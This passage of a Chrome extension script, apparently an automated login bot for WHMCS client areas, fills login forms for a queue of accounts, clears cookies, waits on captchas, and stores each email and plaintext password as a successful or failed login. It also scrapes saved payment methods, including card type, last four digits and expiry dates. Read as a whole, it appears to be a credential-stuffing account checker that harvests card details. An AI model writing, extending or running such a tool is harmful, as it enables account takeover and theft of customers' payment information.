        'crypto': ['bitcoin', 'crypto', 'cryptocurrency', 'btc', 'ethereum', 'eth'],
        'apple_pay': ['apple pay', 'applepay'],
        'google_pay': ['google pay', 'googlepay', 'gpay'],
        'cash': ['cash', 'nakit'],
        'check': ['check', 'cheque']
    };

    const tableSelectors = [
        '#payMethodList',
        '.table-payment-methods',
        'table',
        '[class*="payment" i] table',
        '[id*="payment" i] table'
    ];
    
    let table = null;

    for (const selector of tableSelectors) {
        try {
            const el = document.querySelector(selector);
            if (el && (el.innerText.toLowerCase().includes('payment') || 
                       el.innerText.toLowerCase().includes('ödeme') ||
                       el.innerText.toLowerCase().includes('card') ||
                       el.innerText.toLowerCase().includes('kart'))) {
                table = el;
                break;
            }
        } catch (e) {}
    }

    if (!table) {
        const pageText = document.body ? document.body.innerText.toLowerCase() : '';
        
        if (pageText.includes('no payment') || 
            pageText.includes('henüz ödeme') ||
            pageText.includes('no saved payment')) {
            return payments;
        }
    }

    if (table) {
        const rows = table.querySelectorAll('tbody tr, tr');

        rows.forEach(row => {
            const cells = row.querySelectorAll('td');
            if (cells.length < 2) return;

            try {
                let methodName = '';
                let description = '';
                let status = '';
                let isDefault = false;
                let isActive = false;
                let cardType = '';
                let cardLast4 = '';
                let expiryDate = '';

                const nameSelectors = ['strong', 'b', 'td:nth-child(2)', 'td:first-child', 'h4', 'h5'];
                for (const sel of nameSelectors) {
                    const el = row.querySelector(sel);
                    if (el) {
                        const text = el.innerText.trim();
                        if (text && text.toLowerCase() !== 'name' && text.length > 1) {
                            methodName = text;
                            break;
                        }
                    }
                }

                for (let i = 0; i < cells.length; i++) {
                    const cellText = cells[i].innerText.trim();
                    if (cellText && cellText !== methodName && cellText.length > 2) {
                        description = cellText;
                        break;
                    }
                }

                const rowText = row.innerText.toLowerCase();
                for (const [type, keywords] of Object.entries(paymentKeywords)) {
                    for (const keyword of keywords) {
                        if (rowText.includes(keyword.toLowerCase())) {
                            cardType = type;
                            break;
                        }
                    }
                    if (cardType) break;
                }

                const last4Match = rowText.match(/\*\*\*\*\s*(\d{4})/) || 
                                   rowText.match(/ending\s+(\d{4})/i) ||
                                   rowText.match(/son\s+(\d{4})/i) ||
                                   rowText.match(/(\d{4})\s*$/);
                if (last4Match) {
                    cardLast4 = last4Match[1];
                }

                const expiryMatch = rowText.match(/(\d{2}\/\d{2,4})/) ||
                                   rowText.match(/exp(?:ires)?[:\s]+(\d{2}[\/\-]\d{2,4})/i);
                if (expiryMatch) {
                    expiryDate = expiryMatch[1];
                }

                const statusSelectors = ['.label', '.badge', '.status', 'td:nth-last-child(2)', 'td:last-child'];
                for (const sel of statusSelectors) {
                    const el = row.querySelector(sel);
                    if (el) {
                        const text = el.innerText.trim();
                        if (text && (text.toLowerCase().includes('active') || 
                                     text.toLowerCase().includes('inactive') ||
                                     text.toLowerCase().includes('expired'))) {
                            status = text;
                            break;
                        }
                    }
                }

                if (rowText.includes('default') || 
                    rowText.includes('varsayılan') ||
                    row.querySelector('.fa-star, .icon-star, [class*="default"]')) {
                    isDefault = true;
                }

                let statusTR = status;
                const statusLower = status.toLowerCase();

                if (statusLower.includes('active')) {
                    statusTR = 'Aktif';
                    isActive = true;
                } else if (statusLower.includes('inactive')) {
                    statusTR = 'Pasif';
                } else if (statusLower.includes('expired')) {
                    statusTR = 'Süresi Doldu';
                }

                const cardTypeNames = {
                    'mastercard': 'Mastercard',
                    'visa': 'Visa',
                    'paypal': 'PayPal',
                    'american_express': 'American Express',
                    'discover': 'Discover',
                    'stripe': 'Stripe',
                    'bank_transfer': 'Banka Havalesi',
                    'credit_card': 'Kredi Kartı',
                    'debit_card': 'Banka Kartı',
                    'crypto': 'Kripto Para',
                    'apple_pay': 'Apple Pay',
                    'google_pay': 'Google Pay',
                    'cash': 'Nakit',
                    'check': 'Çek'
                };

                let detailedDescription = description;
                if (cardType) {
                    detailedDescription = `[${cardTypeNames[cardType] || cardType}] ${description}`;
                }
                if (cardLast4) {
                    detailedDescription += ` (**** ${cardLast4})`;
                }
                if (expiryDate) {
                    detailedDescription += ` - SKT: ${expiryDate}`;
                }

                if (methodName && methodName.toLowerCase() !== 'name' && methodName.length > 1) {
                    payments.push({
                        methodName,
                        description: detailedDescription,
                        cardType: cardTypeNames[cardType] || cardType,
                        cardLast4,
                        expiryDate,
                        status: statusTR,
                        statusEN: status,
                        isDefault,
                        isActive
                    });
                }
            } catch (e) {}
        });
    }

    if (payments.length === 0) {
        const pageText = document.body ? document.body.innerText.toLowerCase() : '';
        
        for (const [type, keywords] of Object.entries(paymentKeywords)) {
            for (const keyword of keywords) {
                if (pageText.includes(keyword.toLowerCase())) {
                    const cardTypeNames = {
                        'mastercard': 'Mastercard',
                        'visa': 'Visa',
                        'paypal': 'PayPal',
                        'american_express': 'American Express',
                        'discover': 'Discover',
                        'stripe': 'Stripe',
                        'bank_transfer': 'Banka Havalesi',
                        'credit_card': 'Kredi Kartı',
                        'debit_card': 'Banka Kartı',
                        'crypto': 'Kripto Para',
                        'apple_pay': 'Apple Pay',
                        'google_pay': 'Google Pay',
                        'cash': 'Nakit',
                        'check': 'Çek'
                    };
                    
                    const exists = payments.some(p => p.cardType === cardTypeNames[type]);
                    if (!exists) {
                        payments.push({
                            methodName: cardTypeNames[type] || type,
                            description: 'Sayfa içeriğinden tespit edildi',
                            cardType: cardTypeNames[type] || type,
                            cardLast4: '',
                            expiryDate: '',
                            status: 'Bilinmiyor',
                            statusEN: 'Unknown',
                            isDefault: false,
                            isActive: false
                        });
                    }
                    break;
                }
            }
        }
    }

    return payments;
}

// Başarılı giriş kaydet
async function saveSuccessfulLogin(accountData) {
    const { accounts, successfulLogins } = await chrome.storage.local.get(['accounts', 'successfulLogins']);

    const acc = accounts || {};
    const successList = successfulLogins || [];

    acc[accountData.email] = {
        email: accountData.email,
        password: accountData.password,
        loginTime: accountData.loginTime,
        lastStatus: 'Success',
        licenses: accountData.licenses || [],
        payments: accountData.payments || []
    };

    const existingIndex = successList.findIndex(l => l.email === accountData.email);
    const newEntry = {
        email: accountData.email,
        password: accountData.password,
        loginTime: accountData.loginTime,
        licenseCount: (accountData.licenses || []).length,
        paymentCount: (accountData.payments || []).length
    };

    if (existingIndex >= 0) {
        successList[existingIndex] = newEntry;
    } else {
        successList.push(newEntry);
    }

    await chrome.storage.local.set({
        accounts: acc,
        successfulLogins: successList
    });

    botState.results.successful.push(accountData);
    log(`✅ Kaydedildi: ${accountData.email}`);
}

// Başarısız giriş kaydet
async function saveFailedLogin(email, password, error) {
    const { failedLogins } = await chrome.storage.local.get(['failedLogins']);
    const failList = failedLogins || [];

    const existingIndex = failList.findIndex(l => l.email === email);
    const newEntry = {
        email,
        password,
        error,
        time: new Date().toISOString()
    };

    if (existingIndex >= 0) {
        failList[existingIndex] = newEntry;
    } else {
        failList.push(newEntry);
    }

    await chrome.storage.local.set({ failedLogins: failList });
    botState.results.failed.push({ email, password, error });
}

// Single Login
async function singleLogin(email, password) {
    const tab = await chrome.tabs.create({
        url: CONFIG.URLS.LOGIN,
        active: true
    });

    await wait(3000);

    await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: fillLoginForm,
        args: [email, password]
    });
}

// Finish Bot
async function finishBot() {
    botState.running = false;
    botState.paused = false;
    botState.startTime = null;
    botState.isWaitingForCaptcha = false;
    botState.captchaResolved = false;
    stopTabMonitoring();
    
    await chrome.storage.local.set({ botRunning: false });

    log('✅ Tüm hesaplar işlendi!');
    log(`📊 Sonuç: ${botState.results.successful.length} başarılı, ${botState.results.failed.length} başarısız, ${botState.results.skipped.length} atlanmış`);

    broadcastStatus('BOT_FINISHED', {
        total: botState.queue.length,
        successful: botState.results.successful.length,
        failed: botState.results.failed.length,
        skipped: botState.results.skipped.length
    });

    chrome.notifications.create({
        type: 'basic',
        iconUrl: 'icons/icon128.png',
        title: 'WHMCS Elite CRM Pro',
        message: `Tamamlandı! ${botState.results.successful.length} başarılı, ${botState.results.failed.length} başarısız.`
    });
}

// Helper Functions
function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function clearCookies(domain) {
    return new Promise(resolve => {
        try {
            chrome.cookies.getAll({ domain }, (cookies) => {
                if (!cookies || cookies.length === 0) {
                    resolve();
                    return;
                }
                let count = cookies.length;
                cookies.forEach((cookie) => {
                    const url = "https://" + cookie.domain.replace(/^\./, "") + cookie.path;
                    chrome.cookies.remove({ url, name: cookie.name }, () => {
                        count--;
                        if (count <= 0) resolve();
                    });
                });
            });
        } catch (e) { resolve(); }
    });
}

function log(message) {
    console.log(`[WHMCS Elite] ${message}`);
    chrome.storage.local.get(['botLogs'], (res) => {
        const logs = res.botLogs || [];
        logs.push({ time: new Date().toISOString(), message });
        if (logs.length > 1000) logs.shift();
        chrome.storage.local.set({ botLogs: logs });
    });
    broadcastStatus('LOG', { message });
}

function broadcastStatus(type, data = {}) {
    chrome.runtime.sendMessage({ type, ...data }).catch(() => {});
}
